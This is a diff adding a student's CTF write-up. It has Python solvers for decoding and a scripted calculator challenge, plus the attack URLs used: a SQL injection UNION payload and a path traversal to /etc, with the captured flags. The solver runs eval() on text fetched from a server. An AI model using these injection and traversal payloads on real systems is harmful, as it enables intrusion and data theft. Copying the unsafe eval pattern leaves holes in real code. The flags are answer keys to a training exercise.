@@ -1,0 +1,74 @@
+Problem 1
+-------------
+```Python
+  ### Part 1
+  # Uses urllib to parse a URL encoded string.
+
+  import urllib
+
+  flag1 = urllib.unquote("%66%6c%61%67%7b%68%31%64%31%6e%67%5f%31%6e%5f%70%6c%34%31%6e%5f%73%31%74%33%7d")
+  print flag1
+
+
+  ### Part 2
+  # Runs a base64 decode loop until we match the first 5 characters to "flag{"
+  # (the sign that we've found the flag).
+
+  flag2 = """Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnhVMjA1VlUxV2NIbFdiVEZIWVZaYWRW
+  RnNhRmRXTTFKUVZrZDRXbVF3TlZsalJsWk9WakZLTmxaclVrZFVNVXB5VFZaV1dHSkhhRlJW
+  YkZwM1ZGWlplVTFVVW1wTmF6VllWbGMxVjFaWFJqWldiRkpoVmpOb2FGUldXbHBrTWtaSldr
+  WlNUbGRGU2paV2FrbzBZekZhV0ZKdVVtcGxiWE01"""
+
+  while (flag2[:5] != "flag{"):
+      flag2 = flag2.decode("base64")
+
+  print flag2
+```
+
+Problem 2
+-------------
+FLAG: flag{you_should_have_solved_this_in_ruby}
+
+```Python
+  import requests
+  import math
+
+  pg = requests.get("http://ctf.hackucf.org:4000/calc/calc.php")
+  expr = pg.text[253:]
+
+  cookie = pg.headers["Set-Cookie"]
+
+  i = 1
+  j = 3
+  r = expr[i:j]
+
+  while (r != "</"):
+      i += 1
+      j += 1
+      r = expr[i:j]
+
+  expr = expr[0:i]
+  expr = expr.replace("<br/>", "")
+
+  headers = { "Cookie": cookie  }
+  res = requests.post("http://ctf.hackucf.org:4000/calc/calc.php", data={ "answer": math.floor(eval(expr)) }, headers=headers)
+
+  print res.text
+
+  ### Found flag:
+  ### flag{you_should_have_solved_this_in_ruby}
+```
+
+Problem 3
+-----------
+Part 1:
+  URL used: http://ctf.hackucf.org:4001/index.php?iamahacker&username=test&debug&password=test%27%20UNION%20SELECT%20*%20FROM%20users;--%20
+  Flag 1: flag{r3qu35t_f0r_f14g_gr4n73d}
+  Flag 2: flag{bAB132_ph1r57_5QL_1Nj3c710n}
+
+Part 2:
+  URL used: http://n0l3ptr.internetzninja.com/web1/index.php?page=../../../../../../../../../../etc/flag
+  Flag: flag{d0t_d0t_sl4sh_etc_sh3llz}
+
+Part 3:
+  Attempted to use a null-byte exploitation similar to that as presented in class, but could not figure out how to get it to work.
